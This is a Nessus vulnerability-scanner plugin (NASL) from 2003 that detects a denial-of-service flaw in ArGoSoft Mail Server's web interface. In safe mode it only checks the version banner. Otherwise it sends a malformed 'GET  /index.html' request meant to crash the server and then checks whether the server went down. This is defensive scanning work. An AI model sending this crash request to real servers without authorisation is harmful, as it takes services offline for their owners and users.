#
# (C) Tenable Network Security
#
# From: "Rushjo@tripbit.org" <rushjo@tripbit.org>
# To: bugtraq@security-focus.com
# Subject: Denial of Service Attack against ArGoSoft Mail Server Version 1.8 
# 



if(description)
{
  script_id(11734);
  
  script_version ("$Revision: 1.1 $");
  name["english"] = "Argosoft DoS";
  script_name(english:name["english"]);
 
  desc["english"] = "
It was possible to kill the remote HTTP server
sending an invalid request to it ('GET  /index.html\n\n').

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbitrary code on your system.

Solution : upgrade your software to the latest version
Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Bad HTTP request";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
  family["english"] = "Denial of Service";
  script_family(english:family["english"]);
  script_require_ports("Services/www", 80);
  script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
  exit(0);
}

########

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(! get_port_state(port)) exit(0);

if( safe_checks() )
{
 banner = get_http_banner(port:port);
 if(egrep(pattern:"^Server: ArGoSoft Mail Server.*.1\.([0-7]\..*|8\.([0-2]\.|3\.[0-5]))", string:banner))
 	{
	security_hole(port);
	}
 exit(0);	
}

if (http_is_dead(port: port)) exit(0);

soc = open_sock_tcp(port);
if(! soc) exit(0);

send(socket:soc, data:'GET  /index.html\n\n');
r = recv_line(socket:soc, length:2048);
close(soc);

if (http_is_dead(port: port)) {  security_hole(port); exit(0); }
